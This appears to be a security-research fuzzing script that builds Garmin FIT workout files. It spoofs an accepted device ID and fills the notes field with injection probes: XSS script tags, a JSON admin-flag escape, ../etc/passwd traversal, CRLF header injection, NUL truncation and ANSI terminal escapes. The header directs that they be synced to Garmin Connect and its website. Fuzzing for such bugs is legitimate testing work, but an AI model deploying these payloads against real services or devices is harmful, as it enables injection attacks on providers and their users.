-- tools/garmin/fuzz_fit_pass8.rail - Pass-8 consumer-side payload propagation.
--
-- Pass 7 confirmed: f[8] (200B notes) and f[0] (16B step_name) are stored
-- verbatim. Format-string bytes survived. Pass 8 takes that primitive and
-- aims it at downstream consumers — Garmin Connect mobile/desktop, the
-- web Connect dashboard, and any tool that ingests the watch's .fit files.
--
-- Each variant fills the 200B notes field with a payload designed to
-- expose a different consumer-side parser bug class. After dropping any
-- of these on the watch, the human operator should:
--   1. View the workout on-device (UI-side parser test)
--   2. USB-sync to Garmin Connect (mobile/desktop parser test)
--   3. View the synced workout on connect.garmin.com (web XSS test)
--   4. Re-export and feed to gpsbabel/fitparse (third-party parser test)
--
-- Variants:
--   p8_html_xss.fit         - notes = <script>...</script> repeated
--   p8_json_inject.fit      - notes = JSON-context escape attempt
--   p8_path_traversal.fit   - notes = ../../../etc/passwd-style
--   p8_crlf_inject.fit      - notes = \r\n header injection probe
--   p8_nul_truncate.fit     - notes = safe\0evil (C-string truncation)
--   p8_ansi_escape.fit      - notes = ESC[2J terminal-injection probe
--
-- All FITs use the same gate-passing file_id as prior passes (this watch's
-- serial+product+mfg) so the watch will accept them.

import "stdlib/fit_emit.rail"

gate_passing_file_id _ =
  let f5 = cons (fe_field 0 1 0) []
  let f4 = cons (fe_field 2 2 132) f5
  let f3 = cons (fe_field 1 2 132) f4
  let f2 = cons (fe_field 4 4 134) f3
  cons (fe_field 3 4 140) f2

emit_gate_passing_payload s file_type =
  let _ = fe_write_u32_le s 3422906732
  let _ = fe_write_u32_le s 1145000000
  let _ = fe_write_u16_le s 1
  let _ = fe_write_u16_le s 3126
  let _ = fe_write_u8 s file_type
  0

workout_fields _ =
  let f5 = cons (fe_field 11 2 132) []
  let f4 = cons (fe_field 6 2 132) f5
  let f3 = cons (fe_field 5 4 140) f4
  let f2 = cons (fe_field 4 1 0) f3
  cons (fe_field 8 15 7) f2

workout_step_fields_full _ =
  let f7 = cons (fe_field 7 1 0) []
  let f6 = cons (fe_field 5 4 134) f7
  let f5 = cons (fe_field 4 1 0) f6
  let f4 = cons (fe_field 1 4 134) f5
  let f3 = cons (fe_field 0 1 0) f4
  let f2 = cons (fe_field 8 200 7) f3
  cons (fe_field 254 16 7) f2

mut_namebytes s b i =
  if i >= 15 then 0
  else
    let _ = fe_write_u8 s b
    mut_namebytes s b (i + 1)

emit_workout_header s steps_claimed =
  let _ = fe_emit_header s 0
  let _ = fe_emit_def s 0 0 0 (gate_passing_file_id 0)
  let _ = fe_write_u8 s 0
  let _ = emit_gate_passing_payload s 5
  let _ = fe_emit_def s 1 26 0 (workout_fields 0)
  let _ = fe_write_u8 s 1
  let _ = mut_namebytes s 65 0
  let _ = fe_write_u8 s 0
  let _ = fe_write_u32_le s 0
  let _ = fe_write_u16_le s steps_claimed
  let _ = fe_write_u16_le s 0
  0

write_name16 s b i =
  if i >= 16 then 0
  else
    let _ = fe_write_u8 s b
    write_name16 s b (i + 1)

-- ----- payload writers (each fills a 200B notes slot) --------------------

-- Repeat a payload string indefinitely (mod its length) until 200 bytes.
-- byte_at_in_pattern is the byte at position (i mod payload_len).

p8_html_xss_byte i =
  -- "<script>alert('XS')</script>" = 28 bytes
  let pos = i % 28
  if pos == 0 then 60                             -- <
  else if pos == 1 then 115                       -- s
  else if pos == 2 then 99                        -- c
  else if pos == 3 then 114                       -- r
  else if pos == 4 then 105                       -- i
  else if pos == 5 then 112                       -- p
  else if pos == 6 then 116                       -- t
  else if pos == 7 then 62                        -- >
  else if pos == 8 then 97                        -- a
  else if pos == 9 then 108                       -- l
  else if pos == 10 then 101                      -- e
  else if pos == 11 then 114                      -- r
  else if pos == 12 then 116                      -- t
  else if pos == 13 then 40                       -- (
  else if pos == 14 then 39                       -- '
  else if pos == 15 then 88                       -- X
  else if pos == 16 then 83                       -- S
  else if pos == 17 then 39                       -- '
  else if pos == 18 then 41                       -- )
  else if pos == 19 then 60                       -- <
  else if pos == 20 then 47                       -- /
  else if pos == 21 then 115                      -- s
  else if pos == 22 then 99                       -- c
  else if pos == 23 then 114                      -- r
  else if pos == 24 then 105                      -- i
  else if pos == 25 then 112                      -- p
  else if pos == 26 then 116                      -- t
  else 62                                         -- >

write_html_xss s i =
  if i >= 200 then 0
  else
    let _ = fe_write_u8 s (p8_html_xss_byte i)
    write_html_xss s (i + 1)

-- "\",\"admin\":true,\"x\":\"" = 19 bytes; cycles
p8_json_inject_byte i =
  let pos = i % 19
  if pos == 0 then 34                             -- "
  else if pos == 1 then 44                        -- ,
  else if pos == 2 then 34                        -- "
  else if pos == 3 then 97                        -- a
  else if pos == 4 then 100                       -- d
  else if pos == 5 then 109                       -- m
  else if pos == 6 then 105                       -- i
  else if pos == 7 then 110                       -- n
  else if pos == 8 then 34                        -- "
  else if pos == 9 then 58                        -- :
  else if pos == 10 then 116                      -- t
  else if pos == 11 then 114                      -- r
  else if pos == 12 then 117                      -- u
  else if pos == 13 then 101                      -- e
  else if pos == 14 then 44                       -- ,
  else if pos == 15 then 34                       -- "
  else if pos == 16 then 120                      -- x
  else if pos == 17 then 34                       -- "
  else 58                                         -- :

write_json_inject s i =
  if i >= 200 then 0
  else
    let _ = fe_write_u8 s (p8_json_inject_byte i)
    write_json_inject s (i + 1)

-- "../../../../../etc/passwd" = 25 bytes
p8_path_traversal_byte i =
  let pos = i % 25
  if pos == 0 then 46                             -- .
  else if pos == 1 then 46                        -- .
  else if pos == 2 then 47                        -- /
  else if pos == 3 then 46                        -- .
  else if pos == 4 then 46                        -- .
  else if pos == 5 then 47                        -- /
  else if pos == 6 then 46                        -- .
  else if pos == 7 then 46                        -- .
  else if pos == 8 then 47                        -- /
  else if pos == 9 then 46                        -- .
  else if pos == 10 then 46                       -- .
  else if pos == 11 then 47                       -- /
  else if pos == 12 then 46                       -- .
  else if pos == 13 then 46                       -- .
  else if pos == 14 then 47                       -- /
  else if pos == 15 then 101                      -- e
  else if pos == 16 then 116                      -- t
  else if pos == 17 then 99                       -- c
  else if pos == 18 then 47                       -- /
  else if pos == 19 then 112                      -- p
  else if pos == 20 then 97                       -- a
  else if pos == 21 then 115                      -- s
  else if pos == 22 then 115                      -- s
  else if pos == 23 then 119                      -- w
  else 100                                        -- d

write_path_traversal s i =
  if i >= 200 then 0
  else
    let _ = fe_write_u8 s (p8_path_traversal_byte i)
    write_path_traversal s (i + 1)

-- "\r\nX-Inject: 1\r\n" = 15 bytes
p8_crlf_byte i =
  let pos = i % 15
  if pos == 0 then 13                             -- \r
  else if pos == 1 then 10                        -- \n
  else if pos == 2 then 88                        -- X
  else if pos == 3 then 45                        -- -
  else if pos == 4 then 73                        -- I
  else if pos == 5 then 110                       -- n
  else if pos == 6 then 106                       -- j
  else if pos == 7 then 101                       -- e
  else if pos == 8 then 99                        -- c
  else if pos == 9 then 116                       -- t
  else if pos == 10 then 58                       -- :
  else if pos == 11 then 32                       -- space
  else if pos == 12 then 49                       -- 1
  else if pos == 13 then 13                       -- \r
  else 10                                         -- \n

write_crlf_inject s i =
  if i >= 200 then 0
  else
    let _ = fe_write_u8 s (p8_crlf_byte i)
    write_crlf_inject s (i + 1)

-- "safe" + NUL + "evil_bytes_after_nul" repeated. NUL byte = 0.
-- Pattern: "safe\0evil_after_nul\0" = 20 bytes
p8_nul_byte i =
  let pos = i % 20
  if pos == 0 then 115                            -- s
  else if pos == 1 then 97                        -- a
  else if pos == 2 then 102                       -- f
  else if pos == 3 then 101                       -- e
  else if pos == 4 then 0                         -- NUL
  else if pos == 5 then 101                       -- e
  else if pos == 6 then 118                       -- v
  else if pos == 7 then 105                       -- i
  else if pos == 8 then 108                       -- l
  else if pos == 9 then 95                        -- _
  else if pos == 10 then 97                       -- a
  else if pos == 11 then 102                      -- f
  else if pos == 12 then 116                      -- t
  else if pos == 13 then 101                      -- e
  else if pos == 14 then 114                      -- r
  else if pos == 15 then 95                       -- _
  else if pos == 16 then 110                      -- n
  else if pos == 17 then 117                      -- u
  else if pos == 18 then 108                      -- l
  else 0                                          -- NUL

write_nul_truncate s i =
  if i >= 200 then 0
  else
    let _ = fe_write_u8 s (p8_nul_byte i)
    write_nul_truncate s (i + 1)

-- ESC[2J ESC[H "EVIL" — clears terminal + homes cursor + writes EVIL
-- "\x1b[2J\x1b[HEVIL" = 11 bytes
p8_ansi_byte i =
  let pos = i % 11
  if pos == 0 then 27                             -- ESC
  else if pos == 1 then 91                        -- [
  else if pos == 2 then 50                        -- 2
  else if pos == 3 then 74                        -- J
  else if pos == 4 then 27                        -- ESC
  else if pos == 5 then 91                        -- [
  else if pos == 6 then 72                        -- H
  else if pos == 7 then 69                        -- E
  else if pos == 8 then 86                        -- V
  else if pos == 9 then 73                        -- I
  else 76                                         -- L

write_ansi s i =
  if i >= 200 then 0
  else
    let _ = fe_write_u8 s (p8_ansi_byte i)
    write_ansi s (i + 1)

-- ----- variant emitters --------------------------------------------------

emit_variant path payload_writer =
  let s = fe_new 16384
  let _ = emit_workout_header s 50
  let _ = fe_emit_def s 2 27 0 (workout_step_fields_full 0)
  let _ = emit_steps_loop s 0 50 payload_writer
  let _ = fe_emit_trailing_crc s 0
  let _ = fe_finalize s
  fe_save s path

emit_steps_loop s i n payload_writer =
  if i >= n then 0
  else
    let _ = fe_write_u8 s 2
    let _ = write_name16 s 80 0
    let _ = fe_write_u32_le s 0
    let _ = fe_write_u32_le s 0
    let _ = payload_writer s 0
    let _ = fe_write_u8 s 0
    let _ = fe_write_u8 s 0
    let _ = fe_write_u8 s 0
    emit_steps_loop s (i + 1) n payload_writer

main =
  let argv = args
  let out_dir = if length argv >= 2 then head (tail argv)
                else "/Users/user/garmin_recon/fuzz/fit_corpus_p8"
  let _ = shell (cat ["mkdir -p '", out_dir, "'"])
  let _ = print (cat ["pass-8 corpus -> ", out_dir])
  let _ = emit_variant (cat [out_dir, "/p8_html_xss.fit"]) write_html_xss
  let _ = print "  p8_html_xss.fit       (notes = <script>... XSS pattern)"
  let _ = emit_variant (cat [out_dir, "/p8_json_inject.fit"]) write_json_inject
  let _ = print "  p8_json_inject.fit    (notes = JSON context escape)"
  let _ = emit_variant (cat [out_dir, "/p8_path_traversal.fit"]) write_path_traversal
  let _ = print "  p8_path_traversal.fit (notes = ../../etc/passwd)"
  let _ = emit_variant (cat [out_dir, "/p8_crlf_inject.fit"]) write_crlf_inject
  let _ = print "  p8_crlf_inject.fit    (notes = CRLF header injection)"
  let _ = emit_variant (cat [out_dir, "/p8_nul_truncate.fit"]) write_nul_truncate
  let _ = print "  p8_nul_truncate.fit   (notes = safe\\0evil for C-string truncation)"
  let _ = emit_variant (cat [out_dir, "/p8_ansi_escape.fit"]) write_ansi
  let _ = print "  p8_ansi_escape.fit    (notes = ESC[2J for terminal injection)"
  0
